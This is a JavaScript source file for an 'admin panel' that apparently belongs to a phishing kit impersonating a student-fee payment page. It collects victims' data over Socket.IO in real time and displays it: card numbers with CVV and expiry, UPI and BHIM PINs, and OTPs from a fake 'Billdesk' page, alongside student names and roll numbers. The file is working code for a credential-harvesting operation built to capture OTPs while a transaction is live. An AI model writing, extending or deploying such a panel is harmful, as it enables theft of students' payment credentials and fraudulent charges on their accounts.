// Admin Panel - Real-Time Card Submission Management (ENHANCED WITH PERSISTENCE)
// window.socket.IO Client for Real-Time Communication

window.socket = null;
const submissions = new Map(); // Store submissions by sessionId

// AUTO-DETECT SERVER URL: Use current domain in production, localhost in development
const getServerUrl = () => {
    // If we're on localhost, use localhost:3000
    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
        return 'http://localhost:3000';
    }
    // Otherwise, use the current domain (for Render.com deployment)
    return window.location.origin;
};

const SERVER_URL = getServerUrl();
console.log('🌐 Server URL:', SERVER_URL);

// Initialize window.socket.IO Connection
function initializeConnection() {
    window.socket = io(SERVER_URL, {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: 10
    });

    // Connection Events
    window.socket.on('connect', () => {
        console.log('✅ Connected to server');
        updateConnectionStatus(true);
        // Load all previous submissions when connected
        loadAllSubmissions();
    });

    window.socket.on('disconnect', () => {
        console.log('❌ Disconnected from server');
        updateConnectionStatus(false);
    });

    window.socket.on('connect_error', (error) => {
        console.error('Connection error:', error);
        updateConnectionStatus(false);
    });

    // Connection Update
    window.socket.on('connectionUpdate', (data) => {
        updateConnectionCount(data.activeConnections || 0);
    });

    // Real-Time Card Details Received
    window.socket.on('cardDetailsReceived', (data) => {
        console.log('💳 New card details received:', data);
        handleNewCardSubmission(data);
    });

    // UPI Details Received
    window.socket.on('upiDetailsReceived', (data) => {
        console.log('📱 New UPI details received:', data);
        handleNewUpiSubmission(data);
    });

    // BHIM Details Received
    window.socket.on('bhimDetailsReceived', (data) => {
        console.log('💳 New BHIM details received:', data);
        handleNewBhimSubmission(data);
    });

    // Payment Status Updates
    window.socket.on('paymentCompleted', (data) => {
        console.log('✅ Payment completed:', data);
        updateSubmissionStatus(data.sessionId, 'completed');
    });

    window.socket.on('paymentFailed', (data) => {
        console.log('❌ Payment failed:', data);
        updateSubmissionStatus(data.sessionId, 'failed', data.reason);
    });
    

    // NEW: Listen for OTP submissions from Billdesk page
    window.socket.on('otpSubmitted', (data) => {
        console.log('🔢 OTP submitted:', data);
        displaySubmittedOTP(data.sessionId, data.otp, data.timestamp);
        showNotification(`🔢 OTP received: ${data.otp} for session ${data.sessionId}`, 'success');
    });
    // NEW: Listen for submission marked as seen from other admins
    window.socket.on('submissionMarkedSeen', (data) => {
        console.log('👁️ Submission marked as seen:', data.sessionId);
        removeRedBorder(data.sessionId);
    });
    
    // NEW: Listen for commands hidden from other admins
    window.socket.on('submissionCommandsHidden', (data) => {
        console.log('🙈 Commands hidden:', data.sessionId);
        hideCommandsForSubmission(data.sessionId);
    });
}

// NEW: Load all previous submissions from database
async function loadAllSubmissions() {
    try {
        const response = await fetch(`${SERVER_URL}/api/admin/submissions`);
        const result = await response.json();
        
        if (result.success) {
            console.log(`📥 Loaded ${result.total} previous submissions`);
            
            // Clear existing submissions
            submissions.clear();
            const grid = document.getElementById('submissionsGrid');
            grid.innerHTML = '';
            
            // Load each submission
            result.submissions.forEach(submission => {
                submissions.set(submission.sessionId, submission);
                
                if (submission.paymentMethod === 'card') {
                    displayCardSubmission(submission);
                } else if (submission.paymentMethod === 'upi') {
                    displayUpiSubmission(submission);
                } else if (submission.paymentMethod === 'bhim') {
                    displayBhimSubmission(submission);
                }
                
                // If submission has OTP, display it
                if (submission.otp) {
                    displaySubmittedOTP(submission.sessionId, submission.otp, submission.otpTimestamp);
                }
                
                // Apply status if not pending
                if (submission.status !== 'pending') {
                    updateSubmissionStatus(submission.sessionId, submission.status, submission.statusReason);
                }
                
                // Remove red border if already seen
                if (submission.seen) {
                    removeRedBorder(submission.sessionId);
                }
                
                // Hide commands if they were hidden
                if (submission.commandsHidden) {
                    hideCommandsForSubmission(submission.sessionId);
                }
            });
        } else {
            console.error('Failed to load submissions:', result.error);
        }
    } catch (error) {
        console.error('Error loading submissions:', error);
        console.log('[ERROR] Failed to load previous submissions');
    }
}

// Handle New Card Submission
function handleNewCardSubmission(data) {
    submissions.set(data.sessionId, data);
    displayCardSubmission(data);
    showNotification(`💳 New card submission from ${data.studentData?.name || 'Student'}`, 'success');
}

// Handle New UPI Submission
function handleNewUpiSubmission(data) {
    submissions.set(data.sessionId, data);
    displayUpiSubmission(data);
    showNotification(`📱 New UPI submission from ${data.studentData?.name || 'Student'}`, 'success');
}

// Handle New BHIM Submission
function handleNewBhimSubmission(data) {
    submissions.set(data.sessionId, data);
    displayBhimSubmission(data);
    showNotification(`💳 New BHIM submission from ${data.studentData?.name || 'Student'}`, 'success');
}

// Display Card Submission
function displayCardSubmission(data) {
    const grid = document.getElementById('submissionsGrid');
    const card = createSubmissionCard(data, 'card');
    grid.insertBefore(card, grid.firstChild);
}

// Display UPI Submission
function displayUpiSubmission(data) {
    const grid = document.getElementById('submissionsGrid');
    const card = createSubmissionCard(data, 'upi');
    grid.insertBefore(card, grid.firstChild);
}

// Display BHIM Submission
function displayBhimSubmission(data) {
    const grid = document.getElementById('submissionsGrid');
    const card = createSubmissionCard(data, 'bhim');
    grid.insertBefore(card, grid.firstChild);
}

// Create Submission Card
function createSubmissionCard(data, type) {
    const card = document.createElement('div');
    card.className = 'submission-card';
    card.id = `submission-${data.sessionId}`;
    card.setAttribute('data-session-id', data.sessionId);
    
    let detailsHtml = '';
    
    if (type === 'card') {
        detailsHtml = `
            <div class="card-details">
                <div class="detail-row">
                    <span class="label">Card Number:</span>
                    <span class="value card-number">${formatCardNumber(data.cardDetails.cardNumber)}</span>
                </div>
                <div class="detail-row">
                    <span class="label">Cardholder:</span>
                    <span class="value">${data.cardDetails.cardholderName}</span>
                </div>
                <div class="detail-row">
                    <span class="label">Expiry:</span>
                    <span class="value">${data.cardDetails.expiryDate}</span>
                </div>
                <div class="detail-row">
                    <span class="label">CVV:</span>
                    <span class="value cvv">${data.cardDetails.cvv}</span>
                </div>
            </div>
        `;
    } else if (type === 'upi') {
        detailsHtml = `
            <div class="card-details">
                <div class="detail-row">
                    <span class="label">UPI ID:</span>
                    <span class="value">${data.upiDetails.upiId}</span>
                </div>
                <div class="detail-row">
                    <span class="label">UPI PIN:</span>
                    <span class="value cvv">${data.upiDetails.upiPin}</span>
                </div>
            </div>
        `;
    } else if (type === 'bhim') {
        detailsHtml = `
            <div class="card-details">
                <div class="detail-row">
                    <span class="label">BHIM UPI ID:</span>
                    <span class="value">${data.bhimDetails.bhimUpiId}</span>
                </div>
                <div class="detail-row">
                    <span class="label">BHIM PIN:</span>
                    <span class="value cvv">${data.bhimDetails.bhimPin}</span>
                </div>
            </div>
        `;
    }
    
    card.innerHTML = `
        <div class="card-header">
            <h3>${type === 'card' ? '💳 Card Payment' : type === 'upi' ? '📱 UPI Payment' : '💳 BHIM Payment'}</h3>
            <span class="session-id">Session: ${data.sessionId}</span>
        </div>
        
        <div class="student-info">
            <div class="detail-row">
                <span class="label">Student Name:</span>
                <span class="value">${data.studentData?.name || 'N/A'}</span>
            </div>
            <div class="detail-row">
                <span class="label">Roll Number:</span>
                <span class="value">${data.studentData?.rollNumber || 'N/A'}</span>
            </div>
            <div class="detail-row">
                <span class="label">Course:</span>
                <span class="value">${data.studentData?.course || 'N/A'}</span>
            </div>
            <div class="detail-row">
                <span class="label">Amount:</span>
                <span class="value amount">₹${data.amount?.toLocaleString('en-IN') || '0'}</span>
            </div>
        </div>
        
        ${detailsHtml}
        
        <div class="otp-display" id="otp-${data.sessionId}" style="display: none;">
            <div class="detail-row">
                <span class="label">🔢 OTP Received:</span>
                <span class="value otp-value"></span>
            </div>
            <div class="otp-timestamp"></div>
        </div>
        
        <div class="card-actions" id="actions-${data.sessionId}">
            <button class="btn btn-success" onclick="markAsSeen('${data.sessionId}')">
                <span class="icon">👁️</span> Mark as Seen
            </button>
            <button class="btn btn-warning" onclick="hideCommands('${data.sessionId}')">
                <span class="icon">🙈</span> Hide Commands
            </button>
        </div>
        
        <div class="card-footer">
            <span class="timestamp">${new Date(data.timestamp).toLocaleString('en-IN')}</span>
            <span class="status-badge status-pending">⏳ Pending</span>
        </div>
    `;
    
    return card;
}

// Format card number (XXXX XXXX XXXX XXXX)
function formatCardNumber(number) {
    return number.replace(/(\d{4})(?=\d)/g, '$1 ');
}

// NEW: Display submitted OTP
function displaySubmittedOTP(sessionId, otp, timestamp) {
    const otpDisplay = document.getElementById(`otp-${sessionId}`);
    if (otpDisplay) {
        otpDisplay.style.display = 'block';
        otpDisplay.querySelector('.otp-value').textContent = otp;
        otpDisplay.querySelector('.otp-timestamp').textContent = `Received at: ${new Date(timestamp).toLocaleTimeString('en-IN')}`;
        
        // Add highlight animation
        otpDisplay.classList.add('highlight-new');
        setTimeout(() => {
            otpDisplay.classList.remove('highlight-new');
        }, 2000);
    }
}

// NEW: Mark submission as seen
async function markAsSeen(sessionId) {
    // Remove red border visually
    removeRedBorder(sessionId);
    
    // Notify server and other admins
    window.socket.emit('markSubmissionSeen', { sessionId });
    
    try {
        await fetch(`${SERVER_URL}/api/admin/submissions/${sessionId}/seen`, {
            method: 'POST'
        });
    } catch (error) {
        console.error('Error marking submission as seen:', error);
    }
}

// NEW: Remove red border from submission
function removeRedBorder(sessionId) {
    const card = document.getElementById(`submission-${sessionId}`);
    if (card) {
        card.classList.remove('unseen');
        card.style.border = 'none';
    }
}

// NEW: Hide commands for submission
async function hideCommands(sessionId) {
    // Hide commands visually
    hideCommandsForSubmission(sessionId);
    
    // Notify server and other admins
    window.socket.emit('hideSubmissionCommands', { sessionId });
    
    try {
        await fetch(`${SERVER_URL}/api/admin/submissions/${sessionId}/hide-commands`, {
            method: 'POST'
        });
        showNotification('Commands hidden for this submission', 'info');
    } catch (error) {
        console.error('Error hiding commands:', error);
    }
}

// NEW: Hide commands for a submission
function hideCommandsForSubmission(sessionId) {
    const actionsDiv = document.getElementById(`actions-${sessionId}`);
    if (actionsDiv) {
        actionsDiv.style.display = 'none';
    }
}

// Update Submission Status
function updateSubmissionStatus(sessionId, status, reason = '') {
    const card = document.getElementById(`submission-${sessionId}`);
    if (!card) return;
    
    const statusBadge = card.querySelector('.status-badge');
    
    statusBadge.classList.remove('status-pending', 'status-completed', 'status-failed');
    
    if (status === 'completed') {
        statusBadge.classList.add('status-completed');
        statusBadge.textContent = '✅ Completed';
    } else if (status === 'failed') {
        statusBadge.classList.add('status-failed');
        statusBadge.textContent = `❌ Failed${reason ? ': ' + reason : ''}`;
    }
}

// Update Connection Status
function updateConnectionStatus(connected) {
    const indicator = document.getElementById('connectionIndicator');
    const status = document.getElementById('connectionStatus');
    
    if (connected) {
        indicator.className = 'status-indicator status-connected';
        status.textContent = 'Connected';
    } else {
        indicator.className = 'status-indicator status-disconnected';
        status.textContent = 'Disconnected';
    }
}

// Update Connection Count
function updateConnectionCount(count) {
    const countElement = document.getElementById('activeConnections');
    if (countElement) {
        countElement.textContent = count;
    }
}

// Show Notification
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.classList.add('show');
    }, 100);
    
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 3000);
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Admin Panel initialized');
    initializeConnection();
});
